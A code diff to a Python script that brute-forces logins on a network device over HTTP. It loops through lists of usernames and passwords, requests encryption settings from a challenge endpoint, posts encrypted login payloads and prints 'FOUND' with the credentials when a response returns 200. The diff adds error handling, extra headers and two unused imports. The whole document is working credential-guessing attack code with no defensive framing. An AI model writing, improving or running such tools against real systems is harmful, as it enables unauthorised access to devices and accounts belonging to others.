@@ -1,5 +1,8 @@
 import argparse
 import threading
+from ftplib import error_perm
+from multiprocessing.managers import Value
+
 import requests
 import hashlib
 import os
@@ -55,9 +58,11 @@ def validate_file(file_path, file_name):
 
 def get_encryption_settings(username, password, ip, port):
     url = challengeUrl.format(ip=ip, port=port, username=username, password=password)
-    response = requests.get(url)
+    headers = {'Content-Type': postContentType, 'Accept':postContentType}
+
+    response = requests.get(url=url, headers=headers)
     if response.status_code != 200:
-        raise ValueError("Cannot request encryption settings from: " + url)
+        raise ValueError("Cannot request encryption settings from: " + url + " - "+ str(response.status_code))
     return parse_challenge_response(response.text)
 
 
@@ -112,25 +117,28 @@ def make_request(ip, port, logins, passwords, method):
     timestamp = time.time()
     for login in logins:
         for password in passwords:
-            url = postUrl.format(ip=ip, port=port, timeStamp=timestamp)
-            enc_settings = get_encryption_settings(login, password, ip, port)
+            try:
+                url = postUrl.format(ip=ip, port=port, timeStamp=timestamp)
+                enc_settings = get_encryption_settings(login, password, ip, port)
 
-            payload = create_payload(login, password, enc_settings)
-            headers = {'Content-Type': postContentType}
-            response = requests.post(url, data=payload, headers=headers)
+                payload = create_payload(login, password, enc_settings)
+                headers = {'Content-Type': postContentType}
+                response = requests.post(url, data=payload, headers=headers)
 
-            print(f"Request: {login}, {password} -> Response Code: {response.status_code}")
+                print(f"Request: {login}, {password} -> Response Code: {response.status_code}")
 
-            if response.status_code == 404:
-                print("Url not found (404) - check if target is of correct type")
+                if response.status_code == 404:
+                    print("Url not found (404) - check if target is of correct type")
+                    return
+                if response.status_code == 501:
+                    print("Method POST not allowed  (501) - check if target is of correct type")
+                    return
+                if response.status_code == 200:
+                    print("FOUND: " + login + "/" + password)
+                    return {"user": login, "password": password}
+            except ValueError as error:
+                print(f"Request failed: {error}")
                 return
-            if response.status_code == 501:
-                print("Method POST not allowed  (501) - check if target is of correct type")
-                return
-            if response.status_code == 200:
-                print("FOUND: " + login + "/" + password)
-                return {"user": login, "password": password}
-
 
 #                except Exception as e:(
 #                    print(f"Request failed: {e}"))
